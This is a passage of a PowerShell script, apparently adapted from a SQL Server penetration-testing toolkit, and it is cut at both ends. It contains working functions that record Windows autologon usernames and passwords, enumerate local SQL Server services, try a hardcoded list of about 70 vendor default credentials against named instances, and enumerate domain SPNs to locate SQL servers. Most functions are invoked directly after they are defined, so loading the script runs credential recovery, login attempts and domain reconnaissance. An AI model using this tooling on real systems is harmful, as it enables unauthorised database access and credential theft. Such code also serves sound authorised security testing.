        $AltUsername = $AltResults.Username
        if($AltUsername.length -ge 2){                            

             # Add record to data table
            $AltResults | ForEach-Object{               
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            write-output "$Instance : No alternative auto login credentials found."
        }
    }

    End
    {
        # Return data
         $TblWinAutoCreds 
    }
}
get-sqlrecoverpwautologon
Function  Get-SQLServiceLocal
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance,
       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for running services.')]
        [switch]$RunOnly,
                [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add('ComputerName')
        $null = $TblLocalInstances.Columns.Add('Instance')
        $null = $TblLocalInstances.Columns.Add('ServiceDisplayName')
        $null = $TblLocalInstances.Columns.Add('ServiceName')
        $null = $TblLocalInstances.Columns.Add('ServicePath')
        $null = $TblLocalInstances.Columns.Add('ServiceAccount')
        $null = $TblLocalInstances.Columns.Add('ServiceState')
        $null = $TblLocalInstances.Columns.Add('ServiceProcessId')
    }

    Process
    {
        # Grab SQL Server services based on file path
        $SqlServices = Get-WmiObject -Class win32_service |
        Where-Object -FilterScript {
            $_.DisplayName -like 'SQL Server *'
        } |
        Select-Object -Property DisplayName, PathName, Name, StartName, State, SystemName, ProcessId

        # Add records to SQL Server instance table
        $SqlServices |
        ForEach-Object -Process {
        
            # Parse Instance
            $ComputerName = [string]$_.SystemName
            $DisplayName = [string]$_.DisplayName
            $ServState = [string]$_.State

            # Set instance to computername by default
            $CurrentInstance = $ComputerName

            # Check for named instance
            $InstanceCheck = ($DisplayName[1..$DisplayName.Length] | Where-Object {$_ -like '('}).count
            if($InstanceCheck) {

                # Set name instance
                $CurrentInstance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]

                # Set default instance
                if($CurrentInstance -like '*\MSSQLSERVER')
                {
                    $CurrentInstance = $ComputerName
                }
            }
          
            # If an instance is set filter out service that dont apply
            if($Instance -and $instance -notlike $CurrentInstance){
                return
            }

            # Filter out services that arent runn if needed
            if($RunOnly -and $ServState -notlike 'Running'){
                return    
                
            }
            
            # Setup process id
            if($_.ProcessId -eq 0){
                $ServiceProcessId = ""
            }else{
                $ServiceProcessId = $_.ProcessId
            }

            # Add row
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.SystemName,
                [string]$CurrentInstance,
                [string]$_.DisplayName,
                [string]$_.Name,
                [string]$_.PathName,
                [string]$_.StartName,
                [string]$_.State,
                [string]$ServiceProcessId)            
        }
    }

    End
    {
        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count

        if(-not $SuppressVerbose){
            write-output "$LocalInstanceCount local SQL Server services were found that matched the criteria."        
        }

        # Return data
        $TblLocalInstances 
    }
}
get-sqlservicelocal
Function  Get-SQLServerLoginDefaultPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
		write-output "Assembling"
        # Table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblResults.Columns.Add('Computer') | Out-Null
        $TblResults.Columns.Add('Instance') | Out-Null
        $TblResults.Columns.Add('Username') | Out-Null
        $TblResults.Columns.Add('Password') | Out-Null 
        $TblResults.Columns.Add('IsSysAdmin') | Out-Null

        # Create table for database of defaults
        $DefaultPasswords = New-Object System.Data.DataTable
        $DefaultPasswords.Columns.Add('Instance') | Out-Null
        $DefaultPasswords.Columns.Add('Username') | Out-Null
        $DefaultPasswords.Columns.Add('Password') | Out-Null        

        # Populate DefaultPasswords data table
        $DefaultPasswords.Rows.Add("ACS","ej","ej") | Out-Null
        $DefaultPasswords.Rows.Add("ACT7","sa","sage") | Out-Null
        $DefaultPasswords.Rows.Add("AOM2","admin","ca_admin") | out-null
        $DefaultPasswords.Rows.Add("ARIS","ARIS9","*ARIS!1dm9n#") | out-null
        $DefaultPasswords.Rows.Add("AutodeskVault","sa","AutodeskVault@26200") | Out-Null      
        $DefaultPasswords.Rows.Add("BOSCHSQL","sa","RPSsql12345") | Out-Null
        $DefaultPasswords.Rows.Add("BPASERVER9","sa","AutoMateBPA9") | Out-Null
        $DefaultPasswords.Rows.Add("CDRDICOM","sa","CDRDicom50!") | Out-Null
        $DefaultPasswords.Rows.Add("CODEPAL","sa","Cod3p@l") | Out-Null
        $DefaultPasswords.Rows.Add("CODEPAL08","sa","Cod3p@l") | Out-Null
        $DefaultPasswords.Rows.Add("CounterPoint","sa","CounterPoint8") | Out-Null
        $DefaultPasswords.Rows.Add("CSSQL05","ELNAdmin","ELNAdmin") | Out-Null
        $DefaultPasswords.Rows.Add("CSSQL05","sa","CambridgeSoft_SA") | Out-Null
        $DefaultPasswords.Rows.Add("CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!") | Out-Null  #Maybe a local windows account
        $DefaultPasswords.Rows.Add("DHLEASYSHIP","sa","DHLadmin@1") | Out-Null
        $DefaultPasswords.Rows.Add("DPM","admin","ca_admin") | out-null
        $DefaultPasswords.Rows.Add("DVTEL","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("EASYSHIP","sa","DHLadmin@1") | Out-Null
        $DefaultPasswords.Rows.Add("ECC","sa","Webgility2011") | Out-Null
        $DefaultPasswords.Rows.Add("ECOPYDB","e+C0py2007_@x","e+C0py2007_@x") | Out-Null
        $DefaultPasswords.Rows.Add("ECOPYDB","sa","ecopy") | Out-Null
        $DefaultPasswords.Rows.Add("Emerson2012","sa","42Emerson42Eme") | Out-Null
        $DefaultPasswords.Rows.Add("HDPS","sa","sa") | Out-Null
        $DefaultPasswords.Rows.Add("HPDSS","sa","Hpdsdb000001") | Out-Null
        $DefaultPasswords.Rows.Add("HPDSS","sa","hpdss") | Out-Null
        $DefaultPasswords.Rows.Add("INSERTGT","msi","keyboa5") | Out-Null
        $DefaultPasswords.Rows.Add("INSERTGT","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("INTRAVET","sa","Webster#1") | Out-Null
        $DefaultPasswords.Rows.Add("MYMOVIES","sa","t9AranuHA7") | Out-Null
        $DefaultPasswords.Rows.Add("PCAMERICA","sa","pcAmer1ca") | Out-Null
        $DefaultPasswords.Rows.Add("PCAMERICA","sa","PCAmerica") | Out-Null
        $DefaultPasswords.Rows.Add("PRISM","sa","SecurityMaster08") | Out-Null
        $DefaultPasswords.Rows.Add("RMSQLDATA","Super","Orange") | out-null
        $DefaultPasswords.Rows.Add("RTCLOCAL","sa","mypassword") | Out-Null
        $DefaultPasswords.Rows.Add("RBAT","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("RIT","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("RCO","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("REDBEAM","sa",'34TJ4@#$') | Out-Null
        $DefaultPasswords.Rows.Add("SALESLOGIX","sa","SLXMaster") | Out-Null
        $DefaultPasswords.Rows.Add("SIDEXIS_SQL","sa","2BeChanged") | Out-Null
        $DefaultPasswords.Rows.Add("SQL2K5","ovsd","ovsd") | Out-Null
        $DefaultPasswords.Rows.Add("SQLEXPRESS","admin","ca_admin") | out-null
        #$DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_client","SysGal.5560") | Out-Null     #SA password = GCSsa5560 
        #$DefaultPasswords.Rows.Add("SQLEXPRESS","gcs_web_client","SysGal.5560") | out-null #SA password = GCSsa5560 
        #$DefaultPasswords.Rows.Add("SQLEXPRESS","NBNUser","NBNPassword") | out-null
        $DefaultPasswords.Rows.Add("STANDARDDEV2014","test","test") | Out-Null 
        $DefaultPasswords.Rows.Add("TEW_SQLEXPRESS","tew","tew") | Out-Null
        $DefaultPasswords.Rows.Add("vocollect","vocollect","vocollect") | Out-Null
        $DefaultPasswords.Rows.Add("VSDOTNET","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("VSQL","sa","111") | Out-Null
        $DefaultPasswords.Rows.Add("CASEWISE","sa","") | Out-Null
        $DefaultPasswords.Rows.Add("VANTAGE","sa","vantage12!") | Out-Null
        $DefaultPasswords.Rows.Add("BCM","bcmdbuser","Bcmuser@06") | Out-Null
        $DefaultPasswords.Rows.Add("BCM","bcmdbuser","Numara@06") | Out-Null
        $DefaultPasswords.Rows.Add("DEXIS_DATA","sa","dexis") | Out-Null
        $DefaultPasswords.Rows.Add("DEXIS_DATA","dexis","dexis") | Out-Null
        $DefaultPasswords.Rows.Add("SMTKINGDOM","SMTKINGDOM",'$ei$micMicro') | Out-Null
        $DefaultPasswords.Rows.Add("RE7_MS","Supervisor",'Supervisor') | Out-Null
        $DefaultPasswords.Rows.Add("RE7_MS","Admin",'Admin') | Out-Null
        $DefaultPasswords.Rows.Add("OHD","sa",'ohdusa@123') | Out-Null
        $DefaultPasswords.Rows.Add("UPC","serviceadmin",'Password.0') | Out-Null           #Maybe a local windows account
        $DefaultPasswords.Rows.Add("Hirsh","Velocity",'i5X9FG42') | Out-Null
        $DefaultPasswords.Rows.Add("Hirsh","sa",'i5X9FG42') | Out-Null
        $DefaultPasswords.Rows.Add("SPSQL","sa",'SecurityMaster08') | Out-Null
        $DefaultPasswords.Rows.Add("CAREWARE","sa",'') | Out-Null        

        $PwCount = $DefaultPasswords | measure | select count -ExpandProperty count
        Write-Output "Loaded $PwCount default passwords."
    }

    Process
    {
	write-output "parsing"
        # Parse computer name from the instance
        $ComputerName = 127.0.0.1

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
       
        # Grab only the instance name       
        $TargetInstance = $Instance.Split("\")[1]

        # Bypass ports and default instances
        if(-not $TargetInstance){
            Write-Output "$Instance : No named instance found."
            return
        }
       
        # Check if instance is in list
        $TblResultsTemp = ""
        $TblResultsTemp = $DefaultPasswords | Where-Object { $_.instance -eq "$TargetInstance"}        

        if($TblResultsTemp){    
            Write-Output "$Instance : Confirmed instance match." 
        }else{
            Write-Output "$Instance : No instance match found."
            return 
        }        

        # Test login
		#write-output ($instance).ToString()
		#write-output ($CurrentUsername).ToString()
		#write-output ($CurrentPassword).ToString()
		
		# Grab and iterate username and password
		for($i=0; $i -lt $TblResultsTemp.count; $i++){
			#Write-Output $TblResultsTemp
			$CurrentUsername = $TblResultsTemp.username[$i]
			$CurrentPassword = $TblResultsTemp.password[$i]
			$LoginTest = Get-SQLServerInfo -Instance $instance -Username $CurrentUsername -Password $CurrentPassword -SuppressVerbose
			if($LoginTest){

				write-output "$Instance : Confirmed default credentials - $CurrentUsername/$CurrentPassword"

				$SysadminStatus = $LoginTest | select IsSysadmin -ExpandProperty IsSysadmin

				# Append if successful                      
				$TblResults.Rows.Add(
					$ComputerName,
					$Instance,
					$CurrentUsername,
					$CurrentPassword,
					$SysadminStatus
				) | Out-Null
			}else{
				Write-Output "$Instance : No credential matches were found."
			}
		}
    }

    End
    {
        # Return data
        $TblResults
    }
}
get-sqlserverlogindefaultpw
function Get-DomainSpn
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SPN service code.')]
        [string]$SpnService,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        if(-not $SuppressVerbose)
        {
            write-output -Message 'Getting domain SPNs...'
        }

        # Setup table to store results
        $TableDomainSpn = New-Object -TypeName System.Data.DataTable
        $null = $TableDomainSpn.Columns.Add('UserSid')
        $null = $TableDomainSpn.Columns.Add('User')
        $null = $TableDomainSpn.Columns.Add('UserCn')
        $null = $TableDomainSpn.Columns.Add('Service')
        $null = $TableDomainSpn.Columns.Add('ComputerName')
        $null = $TableDomainSpn.Columns.Add('Spn')
        $null = $TableDomainSpn.Columns.Add('LastLogon')
        $null = $TableDomainSpn.Columns.Add('Description')
        $TableDomainSpn.Clear()
    }

    Process
    {

        try
        {
            # Setup LDAP filter
            $SpnFilter = ''

            if($DomainAccount)
            {
                $SpnFilter = "(objectcategory=person)(SamAccountName=$DomainAccount)"
            }

            if($ComputerName)
            {
                $ComputerSearch = "$ComputerName`$"
                $SpnFilter = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }

            # Get results
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=$SpnService*)$SpnFilter)" -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential

            # Parse results
            $SpnResults | ForEach-Object -Process {
                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(' ')
                [string]$SidString = $SidBytes -replace ' ', ''
                #$Spn = $_.properties.serviceprincipalname[0].split(',')

                #foreach ($item in $Spn)
                foreach ($item in $($_.properties.serviceprincipalname))
                {
                    # Parse SPNs
                    $SpnServer = $item.split('/')[1].split(':')[0].split(' ')[0]
                    $SpnService = $item.split('/')[0]

                    # Parse last logon
                    if ($_.properties.lastlogon)
                    {
                        $LastLogon = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }
                    else
                    {
                        $LastLogon = ''
                    }

                    # Add results to table
                    $null = $TableDomainSpn.Rows.Add(
                        [string]$SidString,
                        [string]$_.properties.samaccountname,
                        [string]$_.properties.cn,
                        [string]$SpnService,
                        [string]$SpnServer,
                        [string]$item,
                        $LastLogon,
                        [string]$_.properties.description
                    )
                }
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
        # Check for results
        if ($TableDomainSpn.Rows.Count -gt 0)
        {
            $TableDomainSpnCount = $TableDomainSpn.Rows.Count
            if(-not $SuppressVerbose)
            {
                write-output -Message "$TableDomainSpnCount SPNs found on servers that matched search criteria."
            }
            Return $TableDomainSpn
        }
        else
        {
            write-output -Message '0 SPNs found.'
        }
    }
}
function Get-DomainObject
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP Filter.')]
        [string]$LdapFilter = '',

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP path.')]
        [string]$LdapPath,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Maximum number of Objects to pull from AD, limit is 1,000 .')]
        [int]$Limit = 1000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'scope of a search as either a base, one-level, or subtree search, default is subtree.')]
        [ValidateSet('Subtree','OneLevel','Base')]
        [string]$SearchScope = 'Subtree'
    )
    Begin
    {
	write-output "Invoking get-domainobject"
        # Create PS Credential object
        if($Username -and $Password)
        {
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)
        }

        # Create Create the connection to LDAP
        if ($DomainController)
        {
           
            # Test credentials and grab domain
            try {

                $ArgumentList = New-Object Collections.Generic.List[string]
                $ArgumentList.Add("LDAP://$DomainController")

                if($Username){
                    $ArgumentList.Add($Credential.UserName)
                    $ArgumentList.Add($Credential.GetNetworkCredential().Password)
                }

                $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList $ArgumentList).distinguishedname

                # Authentication failed. distinguishedName property can not be empty.
                if(-not $objDomain){ throw }

            }catch{
                Write-Host "Authentication failed or domain controller is not reachable."
                Break
            }

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = '/'+$LdapPath+','+$objDomain
                $ArgumentList[0] = "LDAP://$DomainController$LdapPath"
            }

            $objDomainPath= New-Object System.DirectoryServices.DirectoryEntry -ArgumentList $ArgumentList

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher $objDomainPath
        }
        else
        {
            $objDomain = ([ADSI]'').distinguishedName

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = $LdapPath+','+$objDomain
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }
            else
            {
                $objDomainPath  = [ADSI]''
            }

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }

        # Setup LDAP filter
        $objSearcher.PageSize = $Limit
        $objSearcher.Filter = $LdapFilter
        $objSearcher.SearchScope = 'Subtree'
    }

    Process
    {
        try
        {
            # Return object
            $objSearcher.FindAll() | ForEach-Object -Process {
                $_
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
    }
}
Get-DomainSpn
Function  Get-SQLInstanceDomain
{
  
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
        [switch]$CheckMgmt,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Preforms a DNS lookup on the instance.')]
        [switch]$IncludeIP,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 3
    )

    Begin
    {
        # Table for SPN output
        $TblSQLServerSpns = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServerSpns.Columns.Add('ComputerName')
        $null = $TblSQLServerSpns.Columns.Add('Instance')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountSid')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccount')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountCn')
        $null = $TblSQLServerSpns.Columns.Add('Service')
        $null = $TblSQLServerSpns.Columns.Add('Spn')
        $null = $TblSQLServerSpns.Columns.Add('LastLogon')
        $null = $TblSQLServerSpns.Columns.Add('Description')

        if($IncludeIP)
        {
            $null = $TblSQLServerSpns.Columns.Add('IPAddress')
        }
        # Table for UDP scan results of management servers
    }

    Process
    {
        # Get list of SPNs for SQL Servers
        write-output -Message 'Grabbing SPNs from the domain for SQL Servers (MSSQL*)...'
        $TblSQLServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSSQL*' -SuppressVerbose | Where-Object -FilterScript {
            $_.service -like 'MSSQL*'
        }

        write-output -Message 'Parsing SQL Server instances from SPNs...'

        # Add column containing sql server instance
        $TblSQLServers |
        ForEach-Object -Process {
            # Parse SQL Server instance
            $Spn = $_.Spn
            $Instance = $Spn.split('/')[1].split(':')[1]

            # Check if the instance is a number and use the relevent delim
            $Value = 0
            if([int32]::TryParse($Instance,[ref]$Value))
            {
                $SpnServerInstance = $Spn -replace ':', ','
            }
            else
            {
                $SpnServerInstance = $Spn -replace ':', '\'
            }

            $SpnServerInstance = $SpnServerInstance -replace 'MSSQLSvc/', ''

            $TableRow = @([string]$_.ComputerName,
                [string]$SpnServerInstance,
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,
                $_.LastLogon,
                [string]$_.Description)

            if($IncludeIP)
            {
                try 
                {
                    $IPAddress = [Net.DNS]::GetHostAddresses([String]$_.ComputerName).IPAddressToString
                    if($IPAddress -is [Object[]])
                    {
                        $IPAddress = $IPAddress -join ", "
                    }
                }
                catch 
                {
                    $IPAddress = "0.0.0.0"
                }
                $TableRow += $IPAddress
            }

            # Add SQL Server spn to table
            $null = $TblSQLServerSpns.Rows.Add($TableRow)
        }

        # Enumerate SQL Server instances from management servers
        if($CheckMgmt)
        {
            write-output -Message 'Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)...'
            $TblMgmtServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSServerClusterMgmtAPI' -SuppressVerbose |
            Where-Object -FilterScript {
                $_.ComputerName -like '*.*'
            } |
            Select-Object -Property ComputerName -Unique |
            Sort-Object -Property ComputerName

            write-output -Message 'Performing a UDP scan of management servers to obtain managed SQL Server instances...'
            $TblMgmtSQLServers = $TblMgmtServers |
            Select-Object -Property ComputerName -Unique |
            Get-SQLInstanceScanUDP -UDPTimeOut $UDPTimeOut
        }
    }

    End
    {
        # Return data
        if($CheckMgmt)
        {
            write-output -Message 'Parsing SQL Server instances from the UDP scan...'
            $Tbl1 = $TblMgmtSQLServers |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl2 = $TblSQLServerSpns |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl3 = $Tbl1 + $Tbl2

            $InstanceCount = $Tbl3.rows.count
            write-output -Message "$InstanceCount instances were found."
            $Tbl3
        }
        else
        {
            $InstanceCount = $TblSQLServerSpns.rows.count
            write-output -Message "$InstanceCount instances were found."
            $TblSQLServerSpns
        }
    }
}
get-sqlinstancedomain
Function  Get-SQLInstanceLocal
{
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add('ComputerName')
        $null = $TblLocalInstances.Columns.Add('Instance')
        $null = $TblLocalInstances.Columns.Add('ServiceDisplayName')
        $null = $TblLocalInstances.Columns.Add('ServiceName')
        $null = $TblLocalInstances.Columns.Add('ServicePath')
        $null = $TblLocalInstances.Columns.Add('ServiceAccount')
        $null = $TblLocalInstances.Columns.Add('State')
    }

    Process
    {
        # Grab SQL Server services for the server
        $SqlServices = Get-SQLServiceLocal | Where-Object -FilterScript {
            $_.ServicePath -like '*sqlservr.exe*'
        }

        # Add recrds to SQL Server instance table
        $SqlServices |
        ForEach-Object -Process {
            # Parse Instance
            $ComputerName = [string]$_.ComputerName
            $DisplayName = [string]$_.ServiceDisplayName

            if($DisplayName)
            {
                $Instance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]
                if($Instance -like '*\MSSQLSERVER')
                {
                    $Instance = $ComputerName
                }
            }
            else
            {
                $Instance = $ComputerName
            }

            # Add record
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.ComputerName,
                [string]$Instance,
                [string]$_.ServiceDisplayName,
                [string]$_.ServiceName,
                [string]$_.ServicePath,
                [string]$_.ServiceAccount,
            [string]$_.ServiceState)
        }
    }

    End
    {

        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count
        write-output -Message "$LocalInstanceCount local instances where found."

        # Return data
        $TblLocalInstances
    }
}
get-sqlinstancelocal
Function Get-SQLServerPolicy
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblPolicyInfo = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                write-output -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                write-output -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = " -- Get-SQLServerPolicy.sql 
                SELECT '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                    p.policy_id,
		            p.name as [PolicyName],
		            p.condition_id,
		            c.name as [ConditionName],
		            c.facet,
		            c.expression as [ConditionExpression],
		            p.root_condition_id,
		            p.is_enabled,
		            p.date_created,
		            p.date_modified,
		            p.description, 
		            p.created_by, 
		            p.is_system,
                    t.target_set_id,
                    t.TYPE,
                    t.type_skeleton
                FROM msdb.dbo.syspolicy_policies p
                INNER JOIN msdb.dbo.syspolicy_conditions c 
	                ON p.condition_id = c.condition_id
                INNER JOIN msdb.dbo.syspolicy_target_sets t
	                ON t.object_set_id = p.object_set_id"

        # Execute Query
        $TblPolicyInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append as needed
        $TblPolicyInfo = $TblPolicyInfo + $TblPolicyInfoTemp
    }

    End
    {
        # Count 
        $PolNum = $TblPolicyInfo.Count
        if($PolNum -eq 0){

            if( -not $SuppressVerbose)
            {
                write-output -Message "$Instance : No policies found."
            }
        }
        
        # Return data
        $TblPolicyInfo
    }
}
Function  Get-SQLConnectionTest
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')
    }

    Process
    {
        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
